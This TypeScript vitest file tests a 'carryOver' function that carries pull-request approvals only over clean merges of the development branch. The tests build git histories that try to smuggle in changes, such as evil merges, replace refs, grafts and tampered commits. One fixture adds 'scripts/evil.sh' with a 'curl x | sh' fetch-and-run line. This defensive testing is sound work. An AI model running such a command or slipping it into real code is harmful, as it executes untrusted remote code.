import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { carryOver, type GitRunner } from '../src/history.ts';
import { BASE_REF, Repo } from './repo.ts';

const SHARED = ['one', 'two', 'three', 'four', 'five', 'six', 'seven', ''].join('\n');
const edit = (line: number, text: string) =>
  SHARED.split('\n')
    .map((l, i) => (i === line ? text : l))
    .join('\n');

let repo: Repo;
// R is the root on development; D1 and D2 move development on; X is the approved PR commit.
let R: string;
let D1: string;
let D2: string;
let X: string;

beforeEach(() => {
  repo = new Repo();
  R = repo.commit(undefined, {
    'src/app.ts': 'app v1\n',
    'shared.txt': SHARED,
    'other.txt': 'o\n',
  });
  D1 = repo.commit(R, { 'other.txt': 'o2\n' });
  D2 = repo.commit(D1, { 'docs/new.md': 'new\n' });
  repo.setBranch('development', D2);
  X = repo.commit(R, { 'src/app.ts': 'app v2\n' });
});

afterEach(() => {
  repo.remove();
});

const carry = (head: string, options: { maxMerges?: number; git?: GitRunner } = {}) =>
  carryOver({ cwd: repo.dir, head, base: BASE_REF, ...options });

describe('carryOver: what carries', () => {
  it('carries nothing when the head is the approved commit itself', async () => {
    const result = await carry(X);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/is not a merge/);
  });

  it('carries an approval over one clean merge of the base branch', async () => {
    const H = repo.merge(X, D1);
    const result = await carry(H);
    expect(result.carried).toEqual([X]);
    expect(result.stop).toBe(`${X} is not a merge`);
  });

  it('carries over several clean merges in a row, naming every commit on the way', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.merge(M1, D2);
    expect((await carry(H)).carried).toEqual([M1, X]);
  });

  it('carries when the base branch changed a PR file in lines the PR did not touch', async () => {
    const pr = repo.commit(R, { 'shared.txt': edit(0, 'ONE') });
    const dev = repo.commit(D2, { 'shared.txt': edit(6, 'SEVEN') });
    repo.setBranch('development', dev);
    const H = repo.merge(pr, dev);
    expect((await carry(H)).carried).toEqual([pr]);
  });

  it('carries a merge that brings nothing new, since the result is still the clean merge', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.merge(M1, D1);
    expect((await carry(H)).carried).toEqual([M1, X]);
  });

  it('accepts the head SHA in uppercase', async () => {
    const H = repo.merge(X, D1);
    expect((await carry(H.toUpperCase())).carried).toEqual([X]);
  });

  it('stops at the cap but keeps the merges it already proved', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.merge(M1, D2);
    const result = await carry(H, { maxMerges: 1 });
    expect(result.carried).toEqual([M1]);
    expect(result.stop).toMatch(/more than 1 merge/);
  });
});

describe('carryOver: author changes never carry', () => {
  it('stops at a plain commit after the approval', async () => {
    const C = repo.commit(X, { 'src/app.ts': 'app v3\n' });
    const H = repo.merge(C, D1);
    const result = await carry(H);
    expect(result.carried).toEqual([C]);
    expect(result.carried).not.toContain(X);
  });

  it('carries nothing to a plain commit made on top of a clean merge', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.commit(M1, { 'src/app.ts': 'sneaky\n' });
    expect((await carry(H)).carried).toEqual([]);
  });

  it('carries nothing to an empty commit, which is still not a merge', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.commitTree(repo.treeOf(M1), [M1]);
    expect((await carry(H)).carried).toEqual([]);
  });

  it.each([
    ['edits a PR file', { 'src/app.ts': 'app v2 plus a backdoor\n' }],
    ['edits a file the PR never touched', { 'other.txt': 'changed in the merge\n' }],
    ['adds a new file', { 'scripts/evil.sh': 'curl x | sh\n' }],
    ['deletes a file', { 'shared.txt': null }],
  ])('rejects an evil merge that %s', async (_name, files) => {
    const H = repo.evilMerge(X, D1, files);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/differs from a clean merge/);
  });

  it('rejects a merge that drops the base change, as the ours strategy does', async () => {
    const H = repo.commitTree(repo.treeOf(X), [X, D1]);
    expect((await carry(H)).stop).toMatch(/differs from a clean merge/);
  });

  it('rejects a merge that takes the base side wholesale and drops the PR change', async () => {
    const H = repo.commitTree(repo.treeOf(D1), [X, D1]);
    expect((await carry(H)).carried).toEqual([]);
  });

  it.each([
    ['the PR side', edit(2, 'pr three')],
    ['the base side', edit(2, 'dev three')],
    ['a mix of both', edit(2, 'pr three and dev three')],
  ])('rejects a conflicted merge resolved to %s', async (_name, resolution) => {
    const pr = repo.commit(R, { 'shared.txt': edit(2, 'pr three') });
    const dev = repo.commit(D2, { 'shared.txt': edit(2, 'dev three') });
    repo.setBranch('development', dev);
    const H = repo.commitTree(repo.tree(repo.treeOf(pr), { 'shared.txt': resolution }), [pr, dev]);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/conflicts/);
  });

  it('rejects an octopus merge even when every extra parent is on the base branch', async () => {
    const tree = repo.cleanMergeTree(repo.merge(X, D1), D2);
    const H = repo.commitTree(tree, [X, D1, D2]);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/3 parents/);
  });

  it('rejects a clean merge of a branch that is not on the base branch', async () => {
    const side = repo.commit(D1, { 'other.txt': 'side branch\n' });
    const H = repo.merge(X, side);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/second parent .* not on the base branch/);
  });

  it('rejects a merge of another unmerged PR that itself merged development', async () => {
    const other = repo.merge(repo.commit(R, { 'third.txt': 'other pr\n' }), D1);
    const H = repo.merge(X, other);
    expect((await carry(H)).carried).toEqual([]);
  });

  it('rejects a merge with the parents reversed, so the walk cannot follow development', async () => {
    const H = repo.commitTree(repo.cleanMergeTree(X, D1), [D1, X]);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/not on the base branch|already on the base branch/);
  });

  it('rejects a merge whose first parent is already on the base branch', async () => {
    const H = repo.merge(D1, D2);
    const result = await carry(H);
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/first parent .* already on the base branch/);
  });

  it('does not carry an approval on a commit dropped by a force push', async () => {
    const Y = repo.commit(R, { 'src/app.ts': 'rewritten\n' });
    const H = repo.merge(Y, D1);
    const result = await carry(H);
    expect(result.carried).toEqual([Y]);
    expect(result.carried).not.toContain(X);
  });

  it('does not carry an approval over a rebase onto development, even with the same change', async () => {
    const rebased = repo.commit(D2, { 'src/app.ts': 'app v2\n' });
    expect((await carry(rebased)).carried).toEqual([]);
  });

  it('rejects a commit object with the same parent listed twice', async () => {
    const tree = repo.treeOf(X);
    const raw = `tree ${tree}\nparent ${X}\nparent ${X}\nauthor T <t@t> 1 +0000\ncommitter T <t@t> 1 +0000\n\ndup\n`;
    const H = repo.gitWith(raw, 'hash-object', '-t', 'commit', '-w', '--stdin', '--literally');
    expect((await carry(H)).carried).toEqual([]);
  });
});

describe('carryOver: history that lies', () => {
  it('reads real parents, not a replace ref that dresses a plain commit up as a clean merge', async () => {
    const C = repo.commit(X, { 'src/app.ts': 'sneaky\n' });
    const disguise = repo.merge(X, D1);
    repo.git('replace', C, disguise);
    repo.git('config', 'core.useReplaceRefs', 'true');
    expect((await carry(C)).carried).toEqual([]);
  });

  it('reads real parents, not a graft that adds the base branch as a parent', async () => {
    const C = repo.commitTree(repo.cleanMergeTree(X, D1), [X]);
    writeFileSync(join(repo.dir, '.git', 'info', 'grafts'), `${C} ${X} ${D1}\n`);
    expect((await carry(C)).carried).toEqual([]);
  });

  it('carries nothing from a shallow clone, where parents may be missing', async () => {
    const H = repo.merge(X, D1);
    repo.setBranch('pr', H);
    const shallow = mkdtempSync(join(tmpdir(), 'review-gate-shallow-'));
    try {
      execFileSync(
        'git',
        ['clone', '-q', '--depth', '1', '--no-single-branch', `file://${repo.dir}`, shallow],
        {
          env: { ...process.env, GIT_CONFIG_NOSYSTEM: '1', GIT_CONFIG_GLOBAL: '/dev/null' },
        },
      );
      const result = await carryOver({
        cwd: shallow,
        head: H,
        base: 'refs/remotes/origin/development',
      });
      expect(result).toEqual({ carried: [], stop: 'history is shallow' });
    } finally {
      rmSync(shallow, { recursive: true, force: true });
    }
  });

  it('carries nothing when the base ref is missing', async () => {
    const H = repo.merge(X, D1);
    const result = await carryOver({ cwd: repo.dir, head: H, base: 'refs/heads/nope' });
    expect(result).toEqual({ carried: [], stop: 'base ref refs/heads/nope not found' });
  });

  it('carries nothing when the head commit is not in the repository', async () => {
    const result = await carry('e'.repeat(40));
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/^head eeeeeee.* not found$/);
  });

  it('carries nothing when the head names a tree, not a commit', async () => {
    const result = await carry(repo.treeOf(X));
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/not found/);
  });

  it('rejects a head that is not a full SHA rather than resolving it as a ref', async () => {
    const result = await carry('development');
    expect(result).toEqual({ carried: [], stop: 'head is not a full commit SHA' });
  });

  it('carries nothing outside a git repository', async () => {
    const empty = mkdtempSync(join(tmpdir(), 'review-gate-norepo-'));
    mkdirSync(join(empty, 'x'));
    try {
      const result = await carryOver({ cwd: join(empty, 'x'), head: X, base: BASE_REF });
      expect(result.carried).toEqual([]);
      expect(result.stop).toMatch(/^git failed/);
    } finally {
      rmSync(empty, { recursive: true, force: true });
    }
  });

  it('carries nothing on a git older than 2.38, which has no merge-tree --write-tree', async () => {
    const git: GitRunner = (args) =>
      Promise.resolve(
        args[0] === 'version'
          ? { code: 0, stdout: Buffer.from('git version 2.37.9\n') }
          : { code: 0, stdout: Buffer.from('') },
      );
    expect(await carry(X, { git })).toEqual({ carried: [], stop: 'git 2.37.9 is older than 2.38' });
  });

  it('carries nothing on a version string it cannot read', async () => {
    const git: GitRunner = () => Promise.resolve({ code: 0, stdout: Buffer.from('nonsense') });
    expect((await carry(X, { git })).stop).toBe('git version unreadable');
  });

  it('carries nothing, not a partial list, when git fails part way through the walk', async () => {
    const M1 = repo.merge(X, D1);
    const H = repo.merge(M1, D2);
    let mergeTrees = 0;
    const real = (await import('../src/history.ts')).runGit;
    const git: GitRunner = async (args, cwd) => {
      if (args.includes('merge-tree')) {
        mergeTrees += 1;
        if (mergeTrees === 2) return { code: 128, stdout: Buffer.from('') };
      }
      return real(args, cwd);
    };
    const result = await carry(H, { git });
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/^git failed/);
  });

  it('carries nothing when git returns a commit whose bytes do not hash to its SHA', async () => {
    const H = repo.merge(X, D1);
    const real = (await import('../src/history.ts')).runGit;
    const git: GitRunner = async (args, cwd) => {
      const out = await real(args, cwd);
      if (args[0] === 'cat-file' && args[1] === 'commit' && args[2] === H) {
        return { code: out.code, stdout: Buffer.concat([out.stdout, Buffer.from('x')]) };
      }
      return out;
    };
    const result = await carry(H, { git });
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/does not match its SHA/);
  });

  it('carries nothing when merge-tree prints something that is not a tree id', async () => {
    const H = repo.merge(X, D1);
    const real = (await import('../src/history.ts')).runGit;
    const git: GitRunner = async (args, cwd) =>
      args.includes('merge-tree') ? { code: 0, stdout: Buffer.from('garbage\n') } : real(args, cwd);
    const result = await carry(H, { git });
    expect(result.carried).toEqual([]);
    expect(result.stop).toMatch(/git failed: merge-tree/);
  });
});
